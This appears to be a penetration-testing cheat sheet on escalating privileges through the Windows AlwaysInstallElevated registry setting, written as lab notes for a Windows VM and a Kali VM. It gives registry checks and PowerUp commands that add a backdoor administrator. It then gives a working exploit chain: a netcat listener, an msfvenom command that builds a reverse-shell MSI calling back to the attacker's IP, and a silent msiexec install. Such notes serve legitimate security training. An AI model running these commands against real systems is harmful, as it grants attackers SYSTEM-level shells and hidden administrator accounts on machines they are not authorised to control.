# <span style="color:lightblue">AlwaysInstallElevated</span>

## <span style="color:lightgreen">Methodology</span>

AlwaysInstallElevated  is a type of Registry Escalation.

This option is equivalent to granting full administrative rights, which can pose a massive security risk. Microsoft strongly discourages the use of this setting.

To install a package with elevated (system) privileges, set the AlwaysInstallElevated value to "1" under both of the following registry keys:
```console
HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```
If the AlwaysInstallElevated value is not set to "1" under both of the preceding registry keys, the installer uses elevated privileges to install managed applications and uses the current user's privilege level for unmanaged applications.

## <span style="color:lightgreen">Detection</span>
### Windows VM

1. Open command prompt and type: 
```console
C:\Temp> reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```
+ `0x1` means its ON
![image](https://user-images.githubusercontent.com/59029171/161007111-57c898d9-d830-45a5-9a2c-f9e867f6c58b.png)

2. In command prompt type: 
```console
C:\Temp>reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
+ `0x1` means its ON
![image](https://user-images.githubusercontent.com/59029171/161007974-38e7b355-0c5e-49ff-9886-6878bbbe86a6.png)

From the both output, we notice that `“AlwaysInstallElevated”` value is `1`. Hence, we can abuse this function to get privilege escalation.

### Using PowerUp

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the AlwaysInstallElevated field)
```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```

![image](https://user-images.githubusercontent.com/59029171/161008622-848721f3-ddf2-4c17-af2a-a8e7f592a3e1.png)

2. Run `Write-UserAddMSI` and Add backdoor user in *Administrators* group (Required RDP access)

![image](https://user-images.githubusercontent.com/59029171/161009230-2b8b4782-60cc-4301-b1ac-d9595b34c392.png)

3. Check local Administrators
```console
C:\Temp> net localgroup administrators
# now backdoor is added to the localgroup administrators group
```

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```
2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f msi -o setup.msi
```
3. Copy the generated file, `setup.msi`, to the Windows VM.

### Windows VM

1. Place `'setup.msi'` in `'C:\Temp'`
2. Open command prompt and type: 
```console
C:\Temp> msiexec /quiet /qn /i C:\Temp\setup.msi
```

### Kali VM

1. Wait for a reverse shell on your kali machine.


